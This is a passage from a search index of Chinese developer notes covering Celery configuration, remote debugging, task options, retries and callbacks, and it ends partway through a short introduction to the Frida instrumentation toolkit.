app.conf.task_serializer = 'json' 多个配置使用 update: app.conf.update(\n    task_serializer='json',\n    accept_content=['json'],  # Ignore other content\n    result_serializer='json',\n    timezone='Europe/Oslo',\n    enable_utc=True,\n) 使用配置文件 配置py模块的方式 配置模块例 celeryconfig.py broker_url = 'pyamqp://'\nresult_backend = 'rpc://'\n\ntask_serializer = 'json'\nresult_serializer = 'json'\naccept_content = ['json']\ntimezone = 'Europe/Oslo'\nenable_utc = True\n\n# 其他配置\n\n# 任务执行错误时的专用队列\ntask_routes = {\n    'tasks.add': 'low-priority',\n}\n\n# 任务限速, 每分钟内允许执行的10个任务\ntask_annotations = {\n    'tasks.add': {'rate_limit': '10/m'}\n} 配置好后加载配置模块 celeryconfig: app.config_from_object('celeryconfig') 可以通过以下命令来进行验证配置模块是否配置正确: $ python -m celeryconfig 配置py类的方式 可以将其写做一个类: from celery import Celery\n\napp = Celery()\n\nclass Config:\n    enable_utc = True\n    timezone = 'Europe/London'\n\napp.config_from_object(Config)\n# or using the fully qualified name of the object:\n#   app.config_from_object('module:Config') 配置环境变量的方式 还可以将配置文件写入环境变量, 后面直接从环境变量读(app.config_from_envvar): import os\nfrom celery import Celery\n\n#: Set default configuration module name\nos.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig')\n\napp = Celery()\napp.config_from_envvar('CELERY_CONFIG_MODULE') 然后通过指定的环境变量进行配置使用的配置模块：\n$ CELERY_CONFIG_MODULE=\"celeryconfig.prod\" celery worker -l info task_routes涉及到自定义队列处理任务,\n详情见: 官网中文翻译文档-路由 部分说明见: 路由 配置的获取/过滤 将配置作为调试信息或类似信息打印出来，那么您也可能希望过滤掉敏感信息，如密码和API密钥。\nCelery 提供了集中打印配置信息工具，其中一个为 humanize(): >>> app.conf.humanize(with_defaults=False, censored=True) 该方法将配置信息转换为列表字符串返回，默认情况下，仅包含修改的键值，可以通过 with_defaults 参数进行包含默认的配置信息。\n可以通过 table() 方法将返回结果转换为字典: >>> app.conf.table(with_defaults=False, censored=True) 注意：Celery 不会删除所有的敏感配置信息，通过正则表达式来进行检索通常命名的信息，\n如果包含敏感信息的自定义配置，Celery 会标识为机密的名称来下进行命名秘钥。\n如果命名中含有子字符串，将会进行过滤: API、TOKEN、KEY、SECRET、PASS、SIGNATURE、DATABASE 注意事项 广播前缀 默认情况下，所有的虚拟机都可以看到广播的消息。 您必须为消息进行设置前缀，以便它们由仅活动的虚拟机接收: app.conf.broker_transport_options = {'fanout_prefix': true} 注意：该选项仅是向后兼容的，老版本不支持。集群中所有的职程都必须要开启设置，否则无法进行通信。 该设置在将来以后的版本是默认配置，所以请尽早进行迁移。 广播模式 默认情况下， 职程（Worker）收到所有与任务相关的事件。 为了避免该情况发生，需要进行配置 fanout_patterns 广播模式，以便职程（Worker）只能订阅相关的事件: app.conf.broker_transport_options = {'fanout_patterns': true} 该设置在将来以后的版本是默认配置。 可见性超时-注意 如果在 可见性超时 内没有完成任务，该任务会重新分配给另外一个职程（Worker）进行执行。 这可能会出现在预计时间超出可见性超时时间的问题，如果出现该问题，任务将重新循环执行。 因此您必须要增加可见性超时时间用于用于匹配最长的执行时间。 注意：Celery会在职程（Worker）关闭的重新分配消息，如果可见性超时时间过长在断电或者强制终止职程（Worker）的情况会\"丢失\"重新分配的任务。 定期执行任务不会被可见性超时影响，因为这是俩个不同的概念。 您可以通过配置同名的配置选项来扩增可见性超时时间: app.conf.broker_transport_options = {'visibility_timeout': 432000} 对应的值必须为 int 类型。 驱逐Key 在某些情况下，Redis会根据（驱逐策略）进行驱逐一些key 可能会出现已经错误问题: InconsistencyError: Probably the key ('_kombu.binding.celery') has been removed from the Redis database. 您可以在Redis服务器的 time_out 参数设置为0进行避免key被驱逐。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html"},{"title":"远程调试任务 (使用 pdb)","text":"基本用法 celery.contrib.rdb 是 pdb 的一个扩展版本，可以对没有终端访问权限的进程进行远程调试。\n使用示例: from celery import task\nfrom celery.contrib import rdb\n\n@task()\ndef add(x, y):\n    result = x + y\n    rdb.set_trace()  # <- set break-point\n    return result set_trace() 在当前位置设置了一个断点，并创建了一个可以通过 telnet 连接的管道用以调试你的任务。 调试器可能同时由多个进程启动，所以调试器将从基础端口(默认情况下为6900)开始搜索可用的端口，而不是使用一个固定的端口。\n基础端口可以通过环境变量 CELERY_RDB_PORT 来进行修改。 默认情况下调试器将只对本机可用，你可以通过 CELERY_RDB_HOST 来设置允许从外界访问调试器。 当职程执行到你指定的断点处时，将会打印如下日志信息: [INFO/MainProcess] Received task:\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8]\n[WARNING/PoolWorker-1] Remote Debugger:6900:\n    Please telnet 127.0.0.1 6900.  Type `exit` in session to continue.\n[2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900:\n    Waiting for client... 如果你使用 telnet 连接了指定的端口，将会显示一个 pdb 的 shell: $ telnet localhost 6900\nConnected to localhost.\nEscape character is '&#94;]'.\n> /opt/devel/demoapp/tasks.py(128)add()\n-> return result\n(Pdb) 输入 help 可以获取可用的命令列表，如果您之前并没有用过 pdb ，最好先阅读一下文档 Python Debugger Manual 。 为了演示，我们将读取 result 变量的值，对其进行修改之后继续执行任务: (Pdb) result\n4\n(Pdb) result = 'hello from rdb'\n(Pdb) continue\nConnection closed by foreign host. 我们修改的结果将在职程的日志呈现: [2011-01-18 14:35:36,599: INFO/MainProcess] Task\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded\n    in 61.481s: 'hello from rdb' 提示 启用断点信号 如果设置了环境变量 CELERY_RDBSIG ，每当收到 SIGUSR2 信号时，就会打开一个 rdb 的实例。主进程和工作进程都是这种情况。 启动职程的示例: $ CELERY_RDBSIG=1 celery worker -l info 你可以通过执行如下命令为任何工作职程启动一个 rdb 的会话: $ kill -USR2 <pid>","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-debug.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-debug.html"},{"title":"celery加载流程与懒加载","text":"程序是懒加载的，在没有实际使用的情况下，是不会进行加载的。 创建一个 Celery 程序的流程如下: 创建用于事件的逻辑时钟实例 创建任务注册表 将自身设置为当前应用程序（如果禁用 set_as_current 参数则不会） 调用 app.on_init() 回调函数(默认情况下不执行任何操作)\napp.task() 装饰器不会在定义任务时创建任务，创建任务通常在使用该任务或应用程序完成后进行创建。 举例说明，在使用任务或访问属性之前，是如何创建任务的: >>> @app.task\n>>> def add(x, y):\n...    return x + y\n\n>>> type(add)\n<class 'celery.local.PromiseProxy'>\n\n>>> add.__evaluated__()\nFalse\n\n>>> add        # <-- causes repr(add) to happen\n<@task: __main__.add>\n\n>>> add.__evaluated__()\nTrue 应用程序的终结可以通过调用 app.finalize() 显式执行，也可以通过访问 app.tasks 属性隐式执行。\n完成创建对象将: 复制必须在应用之间共享的任务\n默认情况下共享任务，如果设置装饰器的 shared 参数，该任务为私有任务。 评估所有待处理的任务装饰器 确保当前所有的人呢我都已经绑定到当前应用程序\n任务绑带到应用程序，便于从配置中获取配置信息。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html"},{"title":"日志","text":"celery 提供了自带的日志机制 get_task_logger: from celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@app.task\ndef add(x, y):\n    logger.info('Adding {0} + {1}'.format(x, y))\n    return x + y","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-logging.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-logging.html"},{"title":"优化","text":"默认情况下，默认的配置项没有针对吞吐量进行优化，默认的配置比较合适大量短任务和比较少的长任务。 如果需要优化吞吐量，请参考优化：Optimizing。 中间人 如果使用的中间人是 RabbitMQ，可以将换成 librabbitmq 模块（通过 C 语言实现的AMQP客户端）: $ pip install librabbitmq 任务执行 避免启动同步子任务 让一个任务等待另一个任务的结果往往是非常低效的，并在工作池耗尽时，可能会导致死锁。\n建议使您的设计异步化，例如使用回调函数。 例子: # 糟糕的使用\n@app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get()\n    info = parse_page.delay(url, page).get()\n    store_page_info.delay(url, info)\n\n# 较好的使用\ndef update_page_info(url):\n    # fetch_page -> parse_page -> store_page\n    chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url)\n    chain()\n\n@app.task()\ndef fetch_page(url):\n    return myhttplib.get(url)\n\n@app.task()\ndef parse_page(page):\n    return myparser.parse_document(page)\n\n@app.task(ignore_result=True)\ndef store_page_info(info, url):\n    PageInfo.objects.create(url=url, info=info) 默认情况下，Celery不允许您在任务中运行同步子任务，但是在极少数或极端情况下您可能需要这么做。 警告 强烈不建议在任务中运行同步子任务。 任务中强制运行同步子任务 @app.task\ndef update_page_info(url):\n    page = fetch_page.delay(url).get(disable_sync_subtasks=False)\n    info = parse_page.delay(url, page).get(disable_sync_subtasks=False)\n    store_page_info.delay(url, info)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html"},{"title":"可选安装工具","text":"安装: pip install celery[librabbitmq,redis,auth,msgpack] 中括号中表示可选拓展, 部分拓展说明: librabbitmq 使用 librabbitmq 的 C 库 redis       使用 Redis 作为消息传输方式或结果后端 mongodb     使用 MongoDB 作为消息传输方式（ 实验性 ），或是结果后端（ 已支持 ）。 auth        序列化工具 msgpack     序列化工具 yaml        序列化工具 eventlet    使用 eventlet 池 gevent      使用 gevent 池 threads     使用 线程 池","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html"},{"title":"一些问题/报错","text":"Module xxx has no attribute ‘celery‘ 报错大概都是这样: Module xxx has no attribute ‘celery‘ celery 对目录模块啥的要求比较严格, 启动的时候, -A/--app 的参数, 需要明确指定具体的实例化 Celery 的 py 文件 如 app.py: # coding: utf-8\nfrom celery import Celery\n\napp = Celery() 所在位置如下: % tree src/time_schedule/app.py\nsrc/time_schedule/app.py  [error opening dir]\n\n0 directories, 0 files 启动: celery -A time_schedule.app --workdir src worker -l info 使用 time_schedule.app 而不是 time_schedule 说明: celery 默认只寻找 指定模块下的 celery.py ,\n除非更名 app.py 为 celery.py 否则必须指定具体的 实例化 Celery 的 py 文件","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html"},{"title":"Celery的Task","text":"参考:: [Celery 中文手册] 任务: Tasks 概念与 异步 的任务类似 基础 使用 task() 装饰器轻松的创建任何可被调用的任务: from .models import User\n\n@app.task\ndef create_user(username, password):\n    User.objects.create(username=username, password=password) 支持指定参数: @app.task(serializer='json')\ndef create_user(username, password):\n    User.objects.create(username=username, password=password) 注意, 若存在多个装饰器, app.task 需要放在首位. 还有一个 app.shared_task 待... 一些属性/方法 app.task装饰器支持的参数 name: 任务注册的名称。 可以手动设置任务名称，也可以通过模块名和类名进行自动生成(默认行为)。 backend: 结果后端的实例，用于任务结果后端，默认为 app.backend，可以通过 result_backend 进行配置。 acks_late: 如果设置为 True，任务执行后（而不是执行前，默认为执行前）才会确认该任务的消息。 注意：如果职程（Worker）执行过程中崩溃，任务可能会执行多次。\n可以通过 task_acks_late 参数来进行全局配置。 track_started: 如果设置为 True，当职程（Worker）执行任务时，任务状态为 stared。 默认为 False，因为在正常情况下是不需要该颗粒度级别的。\n任务要么挂起、完成要么等待重试。\n如果有长时间运行的任务，并且需要报告任当任务状态时，stared比较有用。 任务执行的职程（Worker）和进程 id 可以通过状态的元数据中进行查看（例如：result.info['pid']）。 可以通过 task_track_started 进行全局配置。 rate_limit: Union[int, float, None] 配置任务的频率. 限制指定任务类型的速率（限制在指定时间内运行的任务数量）。当速率限制生效时，任务仍然会完成，但是可能需要一些时间才能开始。 如果限制速率为 None，表示速率限制无效. 速率可以为 int 也可以为 float 类型，则被表示为\"每秒任务数\"。 bind: bool=False 为 Trur 时表示设置第一个参数为 self (task实例) serializer: str 设置序列化方式, 会覆盖掉初始配置. 默认为 task_serializer，\n也可以为 pickle、json、yaml 或者通过 kombu.serialization.registry 注册的自定义序列化方法。 request: 如果该任务正处于执行状态，该信息包含该任务的请求信息。使用多线程本地存储。\n见: request throws: tuple 预期内的异常，如果在元组中含有该异常类，将不会被视为异常。 但是日志会记录到结果后端. time_limit: 该任务的硬时间限制（以秒为单位），如果没有设置职程（Worker）时，使用默认值。 soft_time_limit: 该任务的软时间限制（以秒为单位），如果没有设置职程（Worker）时，使用默认值。 ignore_result: 不存储任务状态信息，如果配置该选项 AsyncResult 将失效，无法进行检测任务情况以及返回内容。 如果你并不关心任务的结果，请务必确定设置 ignore_result 选项，因为存储结果会浪费时间和资源。 store_errors_even_if_ignored: 如果设置为 True ，即使任务被忽略，也会存储错误信息。 compression: 标识需要使用默认压缩方法的字符串。 默认为 task_compression，可以设置为 gzip、bzip2或通过 kombu.compression 注册的自定义压缩方案。 max_retries: int = 3 当前任务调用 self 或使用 autoretry_for 参数时才会启用。 如果重试的次数超过最大限制，会引发 MaxRetriesExceededError 异常。在异常时不会自动重试，所以必须手动调用 retry()。 默认值重试次数为3次，如果设置为 None 会关闭重试限制，直到任务执行成功为止。 速率限制也可以在数值后面添加 \"/s\"、\"/m\" 或 \"/h\"，以秒、分钟或以小时为单位。任务将在指定的时间内平均分配。 例如: \"100/m\" （每分钟100个任务）。则强制会在同一个职程（Worker）实例上启动俩个任务之间至少 600ms 的延迟。 默认值通过 task_default_rate_limit 进行设定：如果未指定，表示默认情况禁用任务的速率限制。 注意，该速率限制为每一个职程（Worker）实例的限制，并非全局速率限制。配置全局速率限制（例如，API每秒最多请求的次数），必须制定队列。 default_retry_delay: Union[int, float] = 30 * 60 如果任务需要重试, 设置每次重试之间的间隔时间. 单位: 秒(s) autoretry_for: 任务失败时重试, 相关的配置.\n异常类的列表或元组，如果任务在执行的过程中引发异常，任务将自动重试。默认情况下不会自动重试任何异常。 见 autoretry_for retry_kwargs: dict 任务失败重试时相关配置. 自定义配置自动重试参数。 注意，如果使用下面的 exponential backoff 选项是，\ncountdown 任务选项将由 Celery 的自动重试系统决定，字典中包含 countdown 会被忽略。 见 retry_kwargs retry_backoff: Union[int, bool] = False 如果将此选项设置为True，则自动重试将按照 exponential backoff 规则延迟。\n第一次重试延迟 1 秒，第二次重试延迟 2 秒，第三次延迟 4 秒，第四次延迟 8 秒，以此类推。\n（如果启用了 retry_jitter 会修改延迟值）。 如果该选项设置为数字，则作为延迟因子.\n例如，该选项设置为 3，那么第一次重试将延迟 3 秒，第二次将延迟 6 秒，第三次延迟 12 秒，第四次延迟 24秒，以此类推。 默认情况下，该选项设置为 False，自动重试不会延迟。 retry_backoff_max: int = 600 如果启动了 retry_backoff，该选项在任务自动重试之间设置以秒为单位的最大延迟。 默认情况，该选项默认值为 600，即 10分钟。 retry_jitter: bool = True Jitter 用于随机性引入指数回退延迟，防止队列中所有任务同时执行. 如果该选项设置为 True，则将 retry_backoff 计算的延迟作为最大值，实际的延迟值为一个介于 0 和最大值之间的一个随机数。 retry 任务失败时的重试 当调用 retry 时，会发送与原始任务相同的ID发送一条消息，将该消息发送到原始任务的对列中。\n当任务被重试时，也会被记录为一个任务状态，便于通过 result 实例来跟踪任务。 例: @app.task(bind=True)\ndef send_twitter_status(self, oauth, tweet):\n    try:\n        twitter = Twitter(oauth)\n        twitter.update_status(tweet)\n    except (Twitter.FailWhaleError, Twitter.LoginError) as exc:\n        raise self.retry(exc=exc) exc 参数主要用传递日志和存储任务结果时的使用的异常信息。exception 和 traceback 都将在任务状态中可用(如果启用了结果后端)。 任务如果有一个 max_retries 值，超出了重试的最大次数，则会重新引发当前的异常信息，但如果: exc 参数没有设置\n该情况会引发 MaxRetriesExceededError 异常 没有异常\n如果没有初始异常来重新引发exc参数，可以使用: self.retry(exc=Twitter.LoginError()) 设置 exc 参数值 request 任务请求：Task Request app.Task.request 包含与当前执行任务相关的信息和状态。\n该请求定义了以下属性: 属性名称 说明 id 执行任务的唯一ID group 任务组的唯一ID（该任务是组成员的情况下） chord 此任务所属的和弦的惟一id(如果该任务是标题的一部分) correlation_id 用于重复数据删除的自定义ID args 选项参数 kwargs 关键字参数 origin 发送任务的主机名 retries 任务重试次数，默认是从 0 开始的 is_eager 如果任务是由客户端执行，并非职程（Worker）执行，设置 True expires 任务预计时间（如果已经设置的情况下），时间为 UTC 格式（取决于 enable_utc 设置） hostname 执行任务的职程（Worker）实例的节点名 delivery_info 添加附加传递消息，主要用于包含交付任务的交换和路由键的映射，retry() 主要用于重新讲任务下发到队列中，该 dict 中的键可用取决于使用的消息中间人（Broker）。 reply-to 回复的发送的队列名称（例如，与 RPC 结果后端一起使用） called_directly 如果职程（Worker）未执行任务，则此标志设置为true timelimit 当前(软、硬)时间限制的元组(如果有的话) callbacks 如果此任务成功返回，将调用的签名列表 errback 如果此任务失败，将调用的签名列表 utc 设置为 true ，启用 UTC headers 与任务消息一起发送的消息头的映射（可以为 None） reply_to 回复的地址（队列名称） correlation_id 一般与任务的ID相同，通常用于AMQP中跟踪回复的内容 root_id 此任务所属工作流中的第一个任务的唯一ID（如果有） parent_id 调用此任务的任务的惟一id（如果有） chain 反转形成链的任务列表（如果有）。列表中最后一个任务是当前任务执行成功之后的下一个任务。如果使用任务协议的第一个版本，则链任务将位于 request.callbacks 中 案例\n访问上下文访问信息的一个任务案例: @app.task(bind=True)\ndef dump_context(self, x, y):\n    print('Executing task id {0.id}, args: {0.args!r} kwargs: {0.kwargs!r}'.format(\n            self.request)) bind 参数表示该函数绑是一个绑定方法，可以通过访问任务类型实例中的属性和方法。 任务重试 使用装饰器参数的方式 有时，您只想在引发特定异常时重试任务。 可也通过 Celery 中 task() 装饰器中的 autoretry_for 参数进行自动重试任务: from twitter.exceptions import FailWhaleError\n\n@app.task(autoretry_for=(FailWhaleError,))\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user) 可以通过 task() 中的 retry_kwargs 参数来指定 retry() 内部调用参数: @app.task(autoretry_for=(FailWhaleError,),\n          retry_kwargs={'max_retries': 5})\ndef refresh_timeline(user):\n    return twitter.refresh_timeline(user) 上面的示例与在 try ... except 语句中包含的代码块使用 retry 效果一致: @app.task\ndef refresh_timeline(user):\n    try:\n        twitter.refresh_timeline(user)\n    except FailWhaleError as exc:\n        raise div.retry(exc=exc, max_retries=5) 如果你想自动重试任何错误，只需使用: @app.task(autoretry_for=(Exception,))\ndef x():\n    ... 手动捕获的方式 见 retry 任务状态 内置状态 PENDING 任务正在等待执行或未知。任何未知的任务 ID 都默认处于挂起状态。 STARTED 任务已经开始。默认情况下不会记录，需要启用，请参阅 app.Task.track_started.。 meta-data：正在执行任务的职程（Worker） pid 和主机名。 SUCCESS 任务执行成功。 meta-data：任务结果返回值 propagates：Yes ready: Yes FAILURE 任务执行失败。\nmeta-data：执行异常时的任务信息，其中 traceback 包含引发错误的堆栈信息。 propagates：Yes RETRY 任务处于重试状态。 meta-data：结果信息包含导致重试的异常信息，traceback 包含引发异常时堆栈的回溯。 propagates：No REVOKED 任务被撤销。 propagates：Yes 自定义状态 使用 update_state() 更新任务状态 只需要设置一个位置的名称，就可以轻松的自定义状态，状态名通常是大写的字符串。 例如，您可以查看定义自定义中止状态的可中止任务: @app.task(bind=True)\ndef upload_files(self, filenames):\n    for i, file in enumerate(filenames):\n        if not self.request.called_directly:\n            self.update_state(state='PROGRESS',\n                meta={'current': i, 'total': len(filenames)}) 在这里，创建了一个名称为\" PROGRESS\"的状态，通过 current 和 total 作为元数据的一部分，\n计算任务当前正在进行状态的任何应用程序以及任务在进程中位置。可以通过该方法来创建任务进度条。 自定义任务类 所有的任务都继承 app.Task 类，run() 方法为任务体。\n例如: @app.task\ndef add(x, y):\n    return x + y 在内部大概会是这样: class _AddTask(app.Task):\n\n    def run(self, x, y):\n        return x + y\nadd = app.tasks[_AddTask.name] 任务调用 apply_async , 发送一个任务消息 delay ,       直接发送一个任务消息,但是不支持运行参数 calling ,     应用一个支持调用接口（例如，add(2,2)）的对象,\n意味着任务不会被一个 worker 执行,但是会在当前线程中执行(但是消息不会被发送) apply_async apply_async(args[, kwargs[, ...]]) 发送一个任务消息。 T.apply_async((arg,), {'kwarg': value}) 从现在起, 十秒内执行: T.apply_async(countdown=10) 从现在起十秒内执行，指明使用eta: T.apply_async(eta=now + timedelta(seconds=10)) 从现在起一分钟执行，但在两分钟后过期: T.apply_async(countdown=60, expires=120) 两天内过期，使用datetime对象: T.apply_async(expires=now + timedelta(days=2)) 一些位置参数: link: Union[Callable, list] Celery支持任务链，一个任务在另一个任务之后。回调任务将用父任务的结果作为一部分参数: res = add.apply_async((2, 2), link=add.s(16))\n\n# 译者注\n# res.get() --> 4 # 2+2 = 4\n# res.children[0].get() --> 20 # 4 + 16 link_error: Union[Callable, list] 添加错误回调签名 例子: @app.task\ndef error_handler(uuid):\n    result = AsyncResult(uuid)\n    exc = result.get(propagate=False)\n    print('Task {0} raised exception: {1!r}\\n{2!r}'.format(\n          uuid, exc, result.traceback)) 可以使用 link_error 执行选项将其添加到任务中: add.apply_async((2, 2), link_error=error_handler.s()) 此外，link 和 link_error 选项都可以是list: add.apply_async((2, 2), link=[add.s(16), other_task.s()]) 然后将依次调用回调/错误返回，并且将使用父任务的返回值作为部分参数来调用所有回调 countdown: int 在某个时间之前结束, 见 countdown eta: datatime 在某个时间之前结束, 见 eta expires: Union[int, datetime] 任务有效期, 与上基本一致, 见 expires retry: bool = True 是否失败重试, 对应配置为: task_publish_retry retry_policy: dict 重试策略, 对应配置为: task_publish_retry_policy. 支持的键为: max_retries: int = 3 最大重试次数，在这种情况下，将抛出重试失败的异常。 值为None意味着它将永远重试。 interval_start: int = 0 定义两次重试之间要等待的秒数（浮点数或整数）。默认值为0（第一次重试是瞬时的）。 interval_step: float = 0.2 在每次连续重试时，此数字将被添加到重试延迟中（浮点数或整数）。默认值为0.2。 interval_max: float=0.2 重试之间等待的最大秒数（浮点数或整数）。默认值为0.2。 例: add.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'interval_start': 0,\n    'interval_step': 0.2,\n    'interval_max': 0.2,\n}) 重试的最长时间为0.4秒。\n默认情况下将其设置为相对较短，因为如果代理连接断开，连接失败可能导致重试堆效应–\n例如，许多 Web 服务器进程正在等待重试，从而阻止了其他传入请求。 delay delay(*args, **kwargs) 直接发送一个任务消息,但是不支持运行参数。 T.delay(arg, kwarg=value) 调用 apply_async 的快捷方式: .delay(_args, *_kwargs) 等价于调用: .apply_async(args, kwargs) 例如, delay 版: task.delay(arg1, arg2, kwarg1='x', kwarg2='y') apply_async版: task.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'}) 尽管运行十分方便，但是如果像设置额外的行参数，必须用 apply_async calling calling(__call__) 应用一个支持调用接口（例如，add(2,2)）的对象,意味着任务不会被一个 worker 执行,但是会在当前线程中执行(但是消息不会被发送)。 任务回调 task支持的函数回调 after_return 任务返回后调用的处理程序 on_failure 任务执行失败时，由职程（Worker）调用。 on_retry 任务重试时，由职程（Worker）调用。 on_success 任务成功时，由职程（Worker）调用。 after_return after_return(self, status, retval, task_id, args, kwargs, einfo) 任务返回后调用的处理程序 位置参数: status  – 当前任务状态\nretval  – 任务返回值/异常\ntask_id – 唯一的任务ID\nargs    – 返回任务的原始参数\nkwargs  – 返回任务的原始关键字 关键字参数: einfo   – 异常信息实例，包含 traceback （有的情况下） 此处理程序的返回值将被忽略。 on_failure on_failure(self, exc, task_id, args, kwargs, einfo) 任务执行失败时，由职程（Worker）调用。 位置参数: exc     – 任务引发的异常。\ntask_id – 执行失败任务的唯一 ID。\nargs    – 任务失败的原始参数。\nkwargs  – 任务失败的原始关键字。 关键字参数: einfo   – 异常信息实例，包含 traceback （有的情况下）。 此处理程序的返回值将被忽略。 on_retry on_retry(self, exc, task_id, args, kwargs, einfo) 任务重试时，由职程（Worker）调用。 位置参数: exc     – 发送给 retry() 函数的异常\ntask_id – 任务重试唯一 ID。\nargs    – 任务重试的原始参数。\nkwargs  – 任务重试的原始关键字。 Keyword Arguments:\neinfo   – 异常信息实例，包含 traceback （有的情况下）。 此处理程序的返回值将被忽略。 on_success on_success(self, retval, task_id, args, kwargs) 任务成功时，由职程（Worker）调用。 位置参数: retval  – 任务的返回值\ntask_id – 执行成功唯一 ID。\nargs    – 任务执行成功时的原始参数。\nkwargs  – 任务执行成功时的原始关键字。 此处理程序的返回值将被忽略。 获取回调改变/状态-on_message Celery 可以通过消息回调获取所有状态的改变。例如对于长时任务发送人任务进程，你可以这样做: @app.task(bind=True)\ndef hello(self, a, b):\n    time.sleep(1)\n    self.update_state(state=\"PROGRESS\", meta={'progress': 50})\n    time.sleep(1)\n    self.update_state(state=\"PROGRESS\", meta={'progress': 90})\n    time.sleep(1)\n    return 'hello world: %i' % (a+b)\n\ndef on_raw_message(body):\n    print(body)\n\nr = hello.apply_async(4, 6)\nprint(r.get(on_message=on_raw_message, propagate=False)) 将生成如下输出: {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n'result': {'progress': 50},\n'children': [],\n'status': 'PROGRESS',\n'traceback': None}\n{'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n'result': {'progress': 90},\n'children': [],\n'status': 'PROGRESS',\n'traceback': None}\n{'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n'result': 'hello world: 10',\n'children': [],\n'status': 'SUCCESS',\n'traceback': None}\nhello world: 10 限制时间-ETA and Countdown ETA (estimated time of arrival, 预计到底时间) 让你设置一个日期和时间，在这个时间之前任务将被执行。 countdown 是一种以秒为单位设置ETA的快捷方式: >>> result = add.apply_async((2, 2), countdown=3)\n>>> result.get()    # this takes at least 3 seconds to return\n20 确保任务在指定的日期和时间之后的某个时间执行，但不一定在该时间执行。\n可能原因可能包括许多项目在队列中等待，或者严重的网络延迟。为了确保您的任务及时执行，你应该监视队列中的拥塞情况。\n使用Munin或类似工具来接收警报，因此可以采取适当的措施来减轻负载。点击查看Munin。 尽管 countdown 是整数，但eta必须是一个 datetime 对象，并指定确切的日期和时间（包括毫秒精度和时区信息）: >>> from datetime import datetime, timedelta\n\n>>> tomorrow = datetime.utcnow() + timedelta(days=1)\n>>> add.apply_async((2, 2), eta=tomorrow) expries 参数定义了一个可选的到期时间，既可以作为任务之后秒发布，或在特定日期和时间使用 datetime: >>> # Task expires after one minute from now.\n>>> add.apply_async((10, 10), expires=60)\n\n>>> # Also supports datetime\n>>> from datetime import datetime, timedelta\n>>> add.apply_async((10, 10), kwargs,\n...                 expires=datetime.now() + timedelta(days=1) 当 worker 收到过期的任务时，它将任务标记为REVOKED 创建连接池 自动池支持 从2.3版开始，支持自动连接池，因此您不必手动处理连接和发布者即可重用连接。 从2.5版开始，默认情况下启用连接池。 您可以通过创建发布者来手动处理连接: results = []\nwith add.app.pool.acquire(block=True) as connection:\n    with add.get_publisher(connection) as publisher:\n        try:\n            for args in numbers:\n                res = add.apply_async((2, 2), publisher=publisher)\n                results.append(res)\nprint([res.get() for res in results]) 尽管这是个特定示例，但是可以更好的展现一组: >>> from celery import group\n\n>>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)]\n>>> res = group(add.s(i, j) for i, j in numbers).apply_async()\n\n>>> res.get()\n[4, 8, 16, 32]","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-task.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-task.html"},{"title":"frida","text":"官网: https://frida.re/docs/home/ 安装: pip install frida frida是一款基于python + javascript 的hook框架，\n可运行在androidioslinuxwinosx等各平台，主要使用动态二进制插桩技术 插桩技术 插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种： 源代码插桩[Source Code Instrumentation(SCI)]：额外代码注入到程序源代码中 二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中。 静态二进制插桩[Static Binary Instrumentation(SBI)]：\n在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件 动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：\n在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。 Frida 是一个用于动态分析和修改应用程序的工具，\n它提供了一种在运行时注入代码到目标应用程序中的方式。\n在 Python 中，Frida 提供了一个名为 \"frida\" 的模块，用于与 Frida 运行时进行交互。 使用 Frida，你可以在目标应用程序的运行过程中实时地监视和修改函数调用、修改内存中的数据、拦截网络通信等。\n它支持多种平台，包括 Android、iOS、Windows、macOS 和 Linux。 在 Python 中，通过导入 \"frida\" 模块，\n你可以编写代码来创建 Frida 会话、加载目标应用程序、注入 JavaScript 或者使用 Python API 进行交互。\n这使得你可以利用 Frida 来进行应用程序的动态分析、逆向工程、漏洞挖掘等任务。 下面是一个示例代码片段，展示了如何使用 \"frida\" 模块创建 Frida 会话和加载目标应用程序: import frida\n\n# 创建 Frida 会话 , 也就是附加到进程\nsession = frida.attach(\"app.exe\")\n\n# 打印目标应用程序的进程 ID\nprint(\"Process ID:\", session.pid)\n\n# ...\n# 执行其他操作，如加载脚本、拦截函数调用等\n# ...\n\n# 关闭会话\nsession.detach() 需要注意的是，Frida 还提供了其他语言的支持，\n如 JavaScript、C#、Swift 